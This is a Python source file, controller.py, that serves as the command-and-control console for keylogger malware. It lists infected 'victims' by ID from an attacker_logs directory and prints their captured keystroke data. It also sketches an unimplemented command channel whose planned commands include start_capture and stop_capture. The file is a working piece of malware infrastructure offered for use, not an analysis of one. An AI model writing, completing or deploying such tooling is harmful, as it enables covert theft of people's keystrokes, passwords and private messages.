#!/usr/bin/env python3
"""
Controller - Manage and monitor victims

Usage:
    python3 controller.py
"""

import os
import sys
import json
import glob
import datetime

LOG_ROOT = "attacker_logs"


def list_victims():
    """List all victims with recent activity."""
    if not os.path.exists(LOG_ROOT):
        print("[!] No logs directory found. Start attacker_server.py first.\n")
        return
    
    victims = [d for d in os.listdir(LOG_ROOT) if os.path.isdir(os.path.join(LOG_ROOT, d))]
    
    if not victims:
        print("[!] No victims found yet.\n")
        return
    
    print(f"\n{'='*70}")
    print(f"{'VICTIM ID':<40} {'LAST ACTIVITY':<20} {'LOGS'}")
    print(f"{'='*70}")
    
    for vid in sorted(victims):
        vdir = os.path.join(LOG_ROOT, vid)
        logs = glob.glob(os.path.join(vdir, "*.log"))
        if not logs:
            continue
        latest = max(logs, key=os.path.getmtime)
        mtime = datetime.datetime.fromtimestamp(os.path.getmtime(latest))
        print(f"{vid:<40} {mtime.strftime('%Y-%m-%d %H:%M:%S'):<20} {len(logs)}")
    
    print(f"{'='*70}\n")


def tail_logs(victim_id=None, lines=20):
    """Display recent log entries from a victim."""
    if not victim_id:
        victims = [d for d in os.listdir(LOG_ROOT) if os.path.isdir(os.path.join(LOG_ROOT, d))]
        if not victims:
            print("[!] No victims available.\n")
            return
        print(f"[?] Available victims: {', '.join(victims[:5])}...\n")
        victim_id = input("Enter victim ID (or partial UUID): ").strip()
    
    # Find matching victim
    matches = [v for v in os.listdir(LOG_ROOT) if victim_id.lower() in v.lower()]
    if not matches:
        print(f"[!] No victim matching '{victim_id}'\n")
        return
    
    if len(matches) > 1:
        print(f"[!] Multiple matches: {matches}\n")
        return
    
    victim_id = matches[0]
    vdir = os.path.join(LOG_ROOT, victim_id)
    logs = sorted(glob.glob(os.path.join(vdir, "*.log")))
    
    if not logs:
        print(f"[!] No logs for {victim_id}\n")
        return
    
    print(f"\n{'='*70}")
    print(f"VICTIM: {victim_id}")
    print(f"{'='*70}\n")
    
    # Read last N lines from all logs combined
    all_entries = []
    for logfile in logs:
        with open(logfile, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line:
                    try:
                        entry = json.loads(line)
                        all_entries.append(entry)
                    except:
                        pass
    
    # Show last N
    for entry in all_entries[-lines:]:
        ts = entry.get('timestamp', 'N/A')
        data = entry.get('data', '')
        print(f"[{ts}] {repr(data)}")
    
    print(f"\n{'='*70}\n")


def send_command(victim_id=None):
    """Send a command to a victim (placeholder - not implemented in basic version)."""
    print("\n[!] Command system not implemented in basic version.")
    print("    To implement:")
    print("    - Add bidirectional WebSocket or polling mechanism")
    print("    - Victim checks for commands periodically")
    print("    - Supported commands: start_capture, stop_capture, flush_logs, switch_mode\n")


def show_menu():
    """Display main menu."""
    print("\n" + "="*70)
    print(" KEYLOGGER C2 CONTROLLER")
    print("="*70)
    print(" 1. List victims")
    print(" 2. View logs (tail)")
    print(" 3. Send command [NOT IMPLEMENTED]")
    print(" 4. Exit")
    print("="*70)


def main():
    """Main controller loop."""
    while True:
        show_menu()
        choice = input("\nSelect option: ").strip()
        
        if choice == '1':
            list_victims()
        elif choice == '2':
            tail_logs()
        elif choice == '3':
            send_command()
        elif choice == '4':
            print("\n[✓] Goodbye.\n")
            sys.exit(0)
        else:
            print("\n[!] Invalid choice.\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[✓] Controller stopped.\n")
        sys.exit(0)
